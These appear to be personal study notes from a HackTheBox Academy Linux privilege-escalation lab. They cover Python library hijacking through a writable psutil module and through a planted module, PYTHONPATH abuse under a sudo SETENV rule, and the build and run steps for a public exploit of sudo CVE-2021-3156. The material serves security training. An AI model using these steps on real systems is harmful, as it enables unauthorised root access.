readme.org
**** Python Script - Content
#+BEGIN_SRC python 
  #!/usr/bin/env python3
  import psutil

  available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

  print(f"Available memory: {round(available_memory, 2)}%")

#+END_SRC 
So this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module ~psutil~ and uses the function ~virtual_memory()~.

So we can look for this function in the folder of ~psutil~ and check if this module has write permissions for us.
**** Module Permissions
#+BEGIN_SRC bash
  grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

  /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
  /usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
  /usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
  /usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
  /usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
  /usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
  /usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
#+END_SRC

#+BEGIN_SRC bash
  ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

  -rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
#+END_SRC
**** Module Contents
#+BEGIN_SRC python
  def virtual_memory():

	  ...SNIP...
	
      global _TOTAL_PHYMEM
      ret = _psplatform.virtual_memory()
      # cached for later use in Process.memory_percent()
      _TOTAL_PHYMEM = ret.total
      return ret
#+END_SRC
This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module ~os~ for testing purposes, which allows us to execute system commands. With this, we can insert the command ~id~ and check during the execution of the script if the inserted code is executed.
**** Module Contents - Hijacking
#+BEGIN_SRC python 
  ...SNIP...

  def virtual_memory():

      ...SNIP...
      #### Hijacking
      import os
      os.system('id')
	

      global _TOTAL_PHYMEM
      ret = _psplatform.virtual_memory()
      # cached for later use in Process.memory_percent()
      _TOTAL_PHYMEM = ret.total
      return ret

  ...SNIP...
#+END_SRC
Now we can run the script with ~sudo~ and check if we get the desired result.
*** Library Path
In Python, each version has a specified order in which libraries (~modules~) are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.
_PYTHoNPATH Listing_
#+BEGIN_SRC bash
  python3 -c 'import sys; print("\n".join(sys.path))'

  /usr/lib/python38.zip
  /usr/lib/python3.8
  /usr/lib/python3.8/lib-dynload
  /usr/local/lib/python3.8/dist-packages
  /usr/lib/python3/dist-packages
#+END_SRC

To be able to use this variant, two prerequisites are necessary.
1.   The module that is imported by the script is located under one of the lower priority paths listed via the ~PYTHONPATH~ variable.
2.   We must have write permissions to one of the paths having a higher priority on the list.

_Psutil Default Installation Location_
#+BEGIN_SRC bash
  pip3 show psutil

  ...SNIP...
  Location: /usr/local/lib/python3.8/dist-packages

  ...SNIP...
#+END_SRC

_Misconfigured Directory Permissions_
#+BEGIN_SRC bash
  ls -la /usr/lib/python3.8

  total 4916
  drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
  ...SNIP...
#+END_SRC
Let us try abusing this misconfiguration to create our own ~psutil~ module containing our own malicious ~virtual_memory()~ function within the ~/usr/lib/python3.8~ directory.

_Hijacked Module Contents - psutil.py_
#+BEGIN_SRC bash
  #!/usr/bin/env python3

  import os

  def virtual_memory():
      os.system('id')
    
#+END_SRC
*** PYTHONPATH Environment Variable
We can see if we have the permissions to set environment variables for the python binary by checking our ~sudo~ permissions:
#+BEGIN_SRC bash
  sudo -l 

  Matching Defaults entries for htb-student on ACADEMY-LPENIX:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User htb-student may run the following commands on ACADEMY-LPENIX:
  (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
#+END_SRC

_Privilege Escalation using PYTHONPATH Environment Variable_
#+BEGIN_SRC bash
  sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

  uid=0(root) gid=0(root) groups=0(root)
  ...SNIP...
#+END_SRC
In this example, we moved the previous python script from the ~/usr/lib/python3.8~ directory to ~/tmp~. From here we once again call ~/usr/bin/python3~ to run ~mem_stats.py~, however, we specify that the ~PYTHONPATH~ variable contain the ~/tmp~ directory so that it forces Python to search that directory looking for the ~psutil~ module to import. As we can see, we once again have successfully run our script under the context of root.
* Recent 0-Days <1 oct 2023>
** Sudo
The ~/etc/sudoers~ file specifies which users or groups are allowed to run specific programs and with what privileges.
#+BEGIN_SRC bash
  sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
  [sudo] password for cry0l1t3:  **********

  Defaults        env_reset
  Defaults        mail_badpass
  Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  Defaults        use_pty
  root            ALL=(ALL:ALL) ALL
  %admin          ALL=(ALL) ALL
  %sudo           ALL=(ALL:ALL) ALL
  cry0l1t3        ALL=(ALL) /usr/bin/id
  @includedir     /etc/sudoers.d
#+END_SRC

One of the latest vulnerabilities for ~sudo~ carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:
    - 1.8.31 - Ubuntu 20.04
    - 1.8.27 - Debian 10
    - 1.9.2 - Fedora 33
    - and others

To find out the version of sudo, the following command is sufficient:
#+BEGIN_SRC bash
  sudo -V | head -n1

  Sudo version 1.8.31
#+END_SRC

We can either download this to a copy of the target system we have created
#+BEGIN_SRC bash
  git clone https://github.com/blasty/CVE-2021-3156.git
  cd CVE-2021-3156
  make

  rm -rf libnss_X
  mkdir libnss_X
  gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
  gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
#+END_SRC

When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.

#+BEGIN_SRC bash
  ./sudo-hax-me-a-sandwich
  usage: ./sudo-hax-me-a-sandwich <target>

    available targets:
    ------------------------------------------------------------
      0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
      1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
      2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
    ------------------------------------------------------------

    manual mode:
      ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
#+END_SRC

We can find out which version of the operating system we are dealing with using the following command:
#+BEGIN_SRC bash
  cat /etc/lsb-release

  DISTRIB_ID=Ubuntu
  DISTRIB_RELEASE=20.04
  DISTRIB_CODENAME=focal
  DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
#+END_SRC

Next, we specify the respective ID for the version operating system and run the exploit with our payload.
#+BEGIN_SRC bash
  ./sudo-hax-me-a-sandwich 1
#+END_SRC
